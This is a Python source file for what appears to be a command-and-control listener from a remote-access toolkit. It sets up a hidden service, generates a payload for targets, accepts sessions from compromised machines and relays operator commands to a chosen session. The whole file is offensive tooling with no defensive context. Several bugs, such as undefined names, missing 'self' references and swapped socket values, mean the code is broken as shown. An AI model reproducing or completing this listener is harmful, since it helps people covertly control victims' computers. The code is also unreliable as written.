import socket
import time
import _thread
import os
import subprocess
import Lib.Generator
from Listners.HiddenService import HiddenService


class Server:

    def __init__(self,port,payload,hiddenservice="new"):
        if hiddenservice == "new":
            h = HiddenService(port,payload)
        self.sock = socket.socket()
        self.payload = payload
        self.addr = h.GetHostName()
        self.port = port
        self.clients = {}
        data = input("[!] do you want to compile the python payload(y:n) ")
        if data == "y":
            opts = {"compile" : True}
        if data == "n":
            opts = {"compile" : False}
        self.generated = Generator.Generator(self.payload,self.port,self.addr,opts)


    def run(self):
        self.sock.bind((self.addr,self.port))
        self.sock.listen(5)
        counter = 1
        _thread.start_new_thread(handler,())        
        while 1:            
            addr,conn = sock.accept()
            c = client(addr,conn)
            self.clients[counter] = c   
            print("recived new session at channel: " + counter)
            counter += 1
            time.sleep(0.5)

    def handler(self):
        self.currentChannel = 0
        while 1:             
                inp = input(self.payload + ">")
                if inp.startswith("set"):
                    self.currentChannel = int(inp.split(" ")[1])
                    self.comunicate()
                if inp.startswith("list"):
                    for channel , c in self.clients.items:
                        print("[+] " + channel + "addr:" + c.addr)
                if inp == "exit":
                    break
    
    def comunicate(self):
        while 1:    
            data = self.clients[self.currentChannel].conn.recv(1024)
            print(repr(data))
            cmd = input(self.payload + "/sessions>")
            if cmd.startswith("change"):
                self.currentChannel = int(cmd.split(" ")[1])
                continue
            if cmd == "exit":
                break
            self.clients[self.currentChannel].conn.send(cmd.encode())

class client:

    def __init__(self,addr,conn):
        self.addr = addr
        self.conn = conn


            
    